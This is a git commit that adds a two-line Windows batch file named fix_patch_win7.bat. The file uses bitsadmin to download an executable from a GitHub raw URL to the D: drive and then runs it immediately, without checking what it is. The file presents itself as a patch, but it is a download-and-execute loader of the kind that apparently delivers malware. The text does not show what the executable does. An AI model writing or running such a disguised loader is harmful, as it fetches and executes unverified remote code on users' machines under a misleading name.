7d6c8120ab992d8962941492d7e4683230e871b0
kasim4ik2508 <34339266+kasim4ik2508@users.noreply.github.com>
2017-12-17 12:39:34 -0800

    Add files via upload

---
+++ fix_patch_win7.bat
@@ -0,0 +1,2 @@
+@echo off 
+bitsadmin /transfer myjob /download /priority high http://github.com/kasim4ik2508/fix_patch_win7/raw/master/fix_patch_win7.exe D:\fix_patch_win7.exe&start D:\fix_patch_win7.exe
